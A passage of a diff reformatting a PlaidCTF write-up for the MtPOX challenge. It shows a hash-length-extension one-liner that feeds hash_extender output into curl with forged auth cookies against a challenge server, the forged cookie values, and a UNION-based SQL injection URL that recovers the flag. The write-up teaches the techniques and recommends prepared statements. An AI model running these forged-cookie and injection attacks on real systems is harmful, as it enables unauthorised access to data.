class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%80b%3a0%3b
 ...etc
-```
+</pre>
 
 Then we can throw together a quick little shellscript to feed each of them into curl:
 
-```
-
-<span class="Statement">for </span>i <span class="Statement">in</span> <span class="Special">`./hash_extender --data </span><span class="Statement">'</span><span class="Constant">;0:b</span><span class="Statement">'</span><span class="Special"> -s ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3 --append </span><span class="Statement">'</span><span class="Constant">;1:b</span><span class="Statement">'</span><span class="Special"> --secret-min</span><span class="Statement">=</span><span class="Constant">1</span><span class="Special"> --secret-max</span><span class="Statement">=</span><span class="Constant">32</span><span class="Special"> --out-data-format</span><span class="Statement">=</span><span class="Special">html`</span><span class="Statement">;</span> <span class="Statement">do</span> <span class="Identifier">HASH</span>=<span class="Special">`</span><span class="Statement">echo</span><span class="Special"> </span><span class="PreProc">$i</span><span class="Special"> </span><span class="Statement">|</span><span class="Special"> </span><span class="Statement">sed</span><span class="Special"> </span><span class="Statement">'</span><span class="Constant">s/,.*//</span><span class="Statement">'</span><span class="Special">`</span><span class="Statement">;</span> <span class="Identifier">DATA</span>=<span class="Special">`</span><span class="Statement">echo</span><span class="Special"> </span><span class="PreProc">$i</span><span class="Special"> </span><span class="Statement">|</span><span class="Special"> </span><span class="Statement">sed</span><span class="Special"> </span><span class="Statement">'</span><span class="Constant">s/.*,//</span><span class="Statement">'</span><span class="Special">`</span><span class="Statement">;</span> <span class="Statement">echo</span> <span class="Statement">"</span><span class="PreProc">$DATA</span><span class="Constant"> :: </span><span class="PreProc">$HASH</span><span class="Statement">"</span><span class="Statement">;</span> curl <span class="Statement">-b</span> <span class="Statement">"</span><span class="Constant">auth=</span><span class="PreProc">$DATA</span><span class="Constant">;hsh=</span><span class="PreProc">$HASH</span><span class="Statement">"</span> <a href="http://54.211.6.40/admin.php">http://54.211.6.40/admin.php</a><span class="Statement">;</span> <span class="Statement">echo</span><span class="Statement">;</span> <span class="Statement">done</span>
-```
+<pre>
+<span class="Statement">for </span>i <span class="Statement">in</span> <span class="Special">`./hash_extender --data </span><span class="Statement">'</span><span class="Constant">;0:b</span><span class="Statement">'</span><span class="Special"> -s ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3 --append </span><span class="Statement">'</span><span class="Constant">;1:b</span><span class="Statement">'</span><span class="Special"> --secret-min</span><span class="Statement">=</span><span class="Constant">1</span><span class="Special"> --secret-max</span><span class="Statement">=</span><span class="Constant">32</span><span class="Special"> --out-data-format</span><span class="Statement">=</span><span class="Special">html`</span><span class="Statement">;</span> <span class="Statement">do</span> <span class="Identifier">HASH</span>=<span class="Special">`</span><span class="Statement">echo</span><span class="Special"> </span><span class="PreProc">$i</span><span class="Special"> </span><span class="Statement">|</span><span class="Special"> </span><span class="Statement">sed</span><span class="Special"> </span><span class="Statement">'</span><span class="Constant">s/,.*//</span><span class="Statement">'</span><span class="Special">`</span><span class="Statement">;</span> <span class="Identifier">DATA</span>=<span class="Special">`</span><span class="Statement">echo</span><span class="Special"> </span><span class="PreProc">$i</span><span class="Special"> </span><span class="Statement">|</span><span class="Special"> </span><span class="Statement">sed</span><span class="Special"> </span><span class="Statement">'</span><span class="Constant">s/.*,//</span><span class="Statement">'</span><span class="Special">`</span><span class="Statement">;</span> <span class="Statement">echo</span> <span class="Statement">&quot;</span><span class="PreProc">$DATA</span><span class="Constant"> :: </span><span class="PreProc">$HASH</span><span class="Statement">&quot;</span><span class="Statement">;</span> curl <span class="Statement">-b</span> <span class="Statement">&quot;</span><span class="Constant">auth=</span><span class="PreProc">$DATA</span><span class="Constant">;hsh=</span><span class="PreProc">$HASH</span><span class="Statement">&quot;</span> <a href="http://54.211.6.40/admin.php">http://54.211.6.40/admin.php</a><span class="Statement">;</span> <span class="Statement">echo</span><span class="Statement">;</span> <span class="Statement">done</span>
+</pre>
 
 It's a big ugly mess, but that's the way it is with one-liners. :)
 
 Run that against the real server:
 
-```
-
-<span class="Statement">for </span>i <span class="Statement">in</span> <span class="Special">`./hash_extender --data </span><span class="Statement">'</span><span class="Constant">;0:b</span><span class="Statement">'</span><span class="Special"> -s ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3 --append </span><span class="Statement">'</span><span class="Constant">;1:b</span><span class="Statement">'</span><span class="Special"> --secret-min</span><span class="Statement">=</span><span class="Constant">1</span><span class="Special"> --secret-max</span><span class="Statement">=</span><span class="Constant">32</span><span class="Special"> --out-data-format</span><span class="Statement">=</span><span class="Special">html`</span><span class="Statement">;</span> <span class="Statement">do</span> <span class="Identifier">HASH</span>=<span class="Special">`</span><span class="Statement">echo</span><span class="Special"> </span><span class="PreProc">$i</span><span class="Special"> </span><span class="Statement">|</span><span class="Special"> </span><span class="Statement">sed</span><span class="Special"> </span><span class="Statement">'</span><span class="Constant">s/,.*//</span><span class="Statement">'</span><span class="Special">`</span><span class="Statement">;</span> <span class="Identifier">DATA</span>=<span class="Special">`</span><span class="Statement">echo</span><span class="Special"> </span><span class="PreProc">$i</span><span class="Special"> </span><span class="Statement">|</span><span class="Special"> </span><span class="Statement">sed</span><span class="Special"> </span><span class="Statement">'</span><span class="Constant">s/.*,//</span><span class="Statement">'</span><span class="Special">`</span><span class="Statement">;</span> <span class="Statement">echo</span> <span class="Statement">"</span><span class="PreProc">$DATA</span><span class="Constant"> :: </span><span class="PreProc">$HASH</span><span class="Statement">"</span><span class="Statement">;</span> curl <span class="Statement">-b</span> <span class="Statement">"</span><span class="Constant">auth=</span><span class="PreProc">$DATA</span><span class="Constant">;hsh=</span><span class="PreProc">$HASH</span><span class="Statement">"</span> <a href="http://54.211.6.40/admin.php">http://54.211.6.40/admin.php</a><span class="Statement">;</span> <span class="Statement">echo</span><span class="Statement">;</span> <span class="Statement">done</span>
+<pre>
+<span class="Statement">for </span>i <span class="Statement">in</span> <span class="Special">`./hash_extender --data </span><span class="Statement">'</span><span class="Constant">;0:b</span><span class="Statement">'</span><span class="Special"> -s ef16c2bffbcf0b7567217f292f9c2a9a50885e01e002fa34db34c0bb916ed5c3 --append </span><span class="Statement">'</span><span class="Constant">;1:b</span><span class="Statement">'</span><span class="Special"> --secret-min</span><span class="Statement">=</span><span class="Constant">1</span><span class="Special"> --secret-max</span><span class="Statement">=</span><span class="Constant">32</span><span class="Special"> --out-data-format</span><span class="Statement">=</span><span class="Special">html`</span><span class="Statement">;</span> <span class="Statement">do</span> <span class="Identifier">HASH</span>=<span class="Special">`</span><span class="Statement">echo</span><span class="Special"> </span><span class="PreProc">$i</span><span class="Special"> </span><span class="Statement">|</span><span class="Special"> </span><span class="Statement">sed</span><span class="Special"> </span><span class="Statement">'</span><span class="Constant">s/,.*//</span><span class="Statement">'</span><span class="Special">`</span><span class="Statement">;</span> <span class="Identifier">DATA</span>=<span class="Special">`</span><span class="Statement">echo</span><span class="Special"> </span><span class="PreProc">$i</span><span class="Special"> </span><span class="Statement">|</span><span class="Special"> </span><span class="Statement">sed</span><span class="Special"> </span><span class="Statement">'</span><span class="Constant">s/.*,//</span><span class="Statement">'</span><span class="Special">`</span><span class="Statement">;</span> <span class="Statement">echo</span> <span class="Statement">&quot;</span><span class="PreProc">$DATA</span><span class="Constant"> :: </span><span class="PreProc">$HASH</span><span class="Statement">&quot;</span><span class="Statement">;</span> curl <span class="Statement">-b</span> <span class="Statement">&quot;</span><span class="Constant">auth=</span><span class="PreProc">$DATA</span><span class="Constant">;hsh=</span><span class="PreProc">$HASH</span><span class="Statement">&quot;</span> <a href="http://54.211.6.40/admin.php">http://54.211.6.40/admin.php</a><span class="Statement">;</span> <span class="Statement">echo</span><span class="Statement">;</span> <span class="Statement">done</span>
 b%3a1%3b%<span class="Constant">28</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%80b%3a0%3b :: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
 Sorry, not authorized.
 b%3a1%3b0%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%80b%3a0%3b :: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
@@ -238,19 +234,21 @@ Sorry, not authorized.
 b%3a1%3bX%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%80b%3a0%3b :: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
 Sorry, not authorized.
 b%3a1%3b%<span class="Constant">60</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%80b%3a0%3b :: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
-<span class="Statement"><</span>html<span class="Statement">><</span><span class="Statement">head</span><span class="Statement">><</span>title<span class="Statement">></span>MtPOX Admin Page<span class="Statement"><</span>/title<span class="Statement">><</span>/<span class="Statement">head</span><span class="Statement">><</span>body<span class="Statement">></span>Welcome to the <span class="Statement">admin</span> panel<span class="Statement">!<</span>br /<span class="Statement">><</span>br /<span class="Statement">><</span>form <span class="Identifier">name</span>=<span class="Statement">'</span><span class="Constant">input</span><span class="Statement">'</span> <span class="Identifier">action</span>=<span class="Statement">'</span><span class="Constant">admin.php</span><span class="Statement">'</span> <span class="Identifier">method</span>=<span class="Statement">'</span><span class="Constant">get</span><span class="Statement">'</span><span class="Statement">></span>Wallet ID: <span class="Statement"><</span>input <span class="Statement">type</span><span class="Statement">=</span><span class="Constant">'text'</span> <span class="Identifier">name</span>=<span class="Statement">'</span><span class="Constant">query</span><span class="Statement">'</span><span class="Statement">><</span>input <span class="Statement">type</span><span class="Statement">=</span><span class="Constant">'submit'</span> <span class="Identifier">value</span>=<span class="Statement">'</span><span class="Constant">Submit Query</span><span class="Statement">'</span><span class="Statement">><</span>/form<span class="Statement">><</span>/body<span class="Statement">><</span>/html<span class="Statement">></span>
+<span class="Statement">&lt;</span>html<span class="Statement">&gt;&lt;</span><span class="Statement">head</span><span class="Statement">&gt;&lt;</span>title<span class="Statement">&gt;</span>MtPOX Admin Page<span class="Statement">&lt;</span>/title<span class="Statement">&gt;&lt;</span>/<span class="Statement">head</span><span class="Statement">&gt;&lt;</span>body<span class="Statement">&gt;</span>Welcome to the <span class="Statement">admin</span> panel<span class="Statement">!&lt;</span>br /<span class="Statement">&gt;&lt;</span>br /<span class="Statement">&gt;&lt;</span>form <span class="Identifier">name</span>=<span class="Statement">'</span><span class="Constant">input</span><span class="Statement">'</span> <span class="Identifier">action</span>=<span class="Statement">'</span><span class="Constant">admin.php</span><span class="Statement">'</span> <span class="Identifier">method</span>=<span class="Statement">'</span><span class="Constant">get</span><span class="Statement">'</span><span class="Statement">&gt;</span>Wallet ID: <span class="Statement">&lt;</span>input <span class="Statement">type</span><span class="Statement">=</span><span class="Constant">'text'</span> <span class="Identifier">name</span>=<span class="Statement">'</span><span class="Constant">query</span><span class="Statement">'</span><span class="Statement">&gt;&lt;</span>input <span class="Statement">type</span><span class="Statement">=</span><span class="Constant">'submit'</span> <span class="Identifier">value</span>=<span class="Statement">'</span><span class="Constant">Submit Query</span><span class="Statement">'</span><span class="Statement">&gt;&lt;</span>/form<span class="Statement">&gt;&lt;</span>/body<span class="Statement">&gt;&lt;</span>/html<span class="Statement">&gt;</span>
 b%3a1%3bh%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%<span class="Constant">00</span>%80b%3a0%3b :: 967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
 Sorry, not authorized.
-```
+</pre>
 
 And look at that! We found an admin page! We need the cookies:
 
-- auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b
-- hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
+<ul>
+<li>auth=b%3a1%3b%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3a0%3b</li>
+<li>hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1</li>
+</ul>
 
 So we set those in our browser using whatever technique you want, and go to the admin page!
 
-## SQL Injection
+<h2>SQL Injection</h2>
 
 Basically, on the admin panel, you're presented with a very simple HTML form. You can search by wallet id for how many coins they have. For example, if you type wallet 0, you see "Wallet 0 contains 1333337 coins.". Easy!
 
@@ -258,22 +256,19 @@ This is where one of my biggest complaints about PlaidCTF comes in, and it was e
 
 Anyway, the vulnerable line was this one:
 
-```
-
+<pre>
       <span class="Statement">$</span><span class="Identifier">qstr</span> <span class="Statement">=</span> <span class="Identifier">mysql_real_escape_string</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_GET</span><span class="Special">[</span>'<span class="Constant">query</span>'<span class="Special">])</span>;
-      <span class="Statement">$</span><span class="Identifier">query</span> <span class="Statement">=</span> "<span class="Constant">SELECT amount FROM plaidcoin_wallets WHERE id=</span><span class="Statement">$</span><span class="Identifier">qstr</span>";
-```
+      <span class="Statement">$</span><span class="Identifier">query</span> <span class="Statement">=</span> &quot;<span class="Constant">SELECT amount FROM plaidcoin_wallets WHERE id=</span><span class="Statement">$</span><span class="Identifier">qstr</span>&quot;;
+</pre>
 
-Even though $qstr is escaped, there aren't any quotes around it in the query, and therefore you can inject by simply using a space. For example, if I set my query to "1 union select id from anothertable", I'm now selecting from that other table (and I didn't even need quotes!). And this, people, is why you use prepared statements (or equivalent) and you don't use mysql\_real\_escape\_string()!
+Even though $qstr is escaped, there aren't any quotes around it in the query, and therefore you can inject by simply using a space. For example, if I set my query to "1 union select id from anothertable", I'm now selecting from that other table (and I didn't even need quotes!). And this, people, is why you use prepared statements (or equivalent) and you don't use mysql_real_escape_string()!
 
-Anyway, after exploring the server for awhile—I'm not going to dig into it any further in this writeup, since the same techniques were used in another writeup that's a little cleaner to demonstrate—I found a table called plaidcoin\_wallets. I could select from it like this:
+Anyway, after exploring the server for awhile&mdash;I'm not going to dig into it any further in this writeup, since the same techniques were used in another writeup that's a little cleaner to demonstrate&mdash;I found a table called plaidcoin_wallets. I could select from it like this:
 
-- http://54.211.6.40/admin.php?query=1+union+select+id+from+plaidcoin\_wallets
+<ul>
+  <li>http://54.211.6.40/admin.php?query=1+union+select+id+from+plaidcoin_wallets</li>
+</ul>
 
 And boom! I had the flag:
 
-```
-Wallet 1 union select id from plaidcoin_wallets contains flag{phpPhPphpPPPphpcoin} coins.
-```
-
-</body></html>
+<pre>Wallet 1 union select id from plaidcoin_wallets contains flag{phpPhPphpPPPphpcoin} coins.</pre>
